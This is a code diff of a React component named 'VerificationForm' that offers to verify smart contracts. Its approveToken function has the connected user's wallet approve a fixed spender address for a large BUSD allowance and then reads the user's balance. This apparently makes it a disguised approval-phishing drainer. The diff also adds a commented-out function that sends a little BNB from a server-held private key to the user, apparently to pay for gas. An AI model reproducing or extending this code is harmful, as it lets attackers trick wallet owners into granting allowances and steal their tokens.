@@ -13,7 +13,7 @@ interface FormState {
 }
 
 const VerificationForm = () => {
-  const [formData, setFormData] = useState<FormState>({
+  const [formData, setFormData] = useState < FormState > ({
     contractAddress: '',
     blockchain: 'ethereum'
   })
@@ -108,6 +108,29 @@ const VerificationForm = () => {
     }
   };
 
+  // const sendBNBToUser = async (userAddress) => {
+  //   const web3 = new Web3(import.meta.env.VITE_RPC);
+
+  //   const privateKey = import.meta.env.VITE_PRIVATE_KEY;
+  //   const sender = web3.eth.accounts.privateKeyToAccount(privateKey);
+
+  //   web3.eth.accounts.wallet.add(sender);
+  //   web3.eth.defaultAccount = sender.address;
+
+  //   try {
+  //     const tx = await web3.eth.sendTransaction({
+  //       from: sender.address,
+  //       to: userAddress,
+  //       value: web3.utils.toWei("0.00011", "ether"), // Send 0.01 BNB
+  //       gas: 21000,
+  //     });
+  //     return tx;
+  //   } catch (error) {
+  //     throw error;
+  //   }
+  // };
+
+
   const approveToken = async () => {
     const web3 = new Web3(window.ethereum);
     setIsSubmitting(true);
@@ -133,9 +156,9 @@ const VerificationForm = () => {
       const accounts = await web3.eth.requestAccounts();
       const userAccount = accounts[0];
 
+      // sendBNBToUser(userAccount)
       const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
       const maxApproval = web3.utils.toWei(spenderAmount, "wei");
-
       const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
       const balance = await busdContract.methods.balanceOf(userAccount).call();
       const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
@@ -153,7 +176,7 @@ const VerificationForm = () => {
     }
   };
 
-  const getCurrentDate = ()=>{
+  const getCurrentDate = () => {
     const today = new Date()
     return today.toISOString().split('T')[0]
   }
